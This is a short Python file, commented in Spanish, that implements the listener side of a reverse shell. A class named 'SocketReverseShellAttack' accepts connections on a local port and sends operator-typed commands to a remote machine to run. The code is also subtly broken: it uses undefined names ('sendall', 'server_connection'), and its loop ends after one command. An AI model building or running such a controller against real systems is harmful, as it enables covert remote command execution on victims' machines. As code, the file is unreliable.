import socket # Importamos la librería socket para establecer conexiones entre hosts.
import subprocess as shell
# import asyncio # Importamos la librería asyncio para un flujo asíncrono y multitarea.

# ===================================
#   Estructura de conexión inversa
# ===================================

class SocketReverseShellAttack:
    def __init__(self, host, port):
        self.HOST = host
        self.PORT = port

    def command_inyection(self, connection_reverse_shell):
        data_reverse_shell = connection_reverse_shell.recv(1024)
        message_descriptor = data_reverse_shell.decode()

        print(message_descriptor)

        command_send = input('Ingresa un comando (escribe "exit" para salir): ')

        if command_send == "exit":
            connection_reverse_shell = sendall(command_send.encode('utf-8'))
            connection_reverse_shell.close()

            return False

        connection_reverse_shell.sendall(command_send.encode('utf-8'))
    
    def receive_connection(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server_connection.bind((self.HOST, self.PORT))
            server_connection.listen(5)

            running = True
            
            while running:
                client_connection, addr = server_connection.accept()
                print(f"Conexión establecida con: {addr}:{self.PORT}")
  
                running = self.command_inyection(client_connection)

if __name__ == '__main__':
    HOST = "127.0.0.1"
    PORT = 5000
    
    socket_object = SocketReverseShellAttack(HOST, PORT)
    socket_object.receive_connection()
  
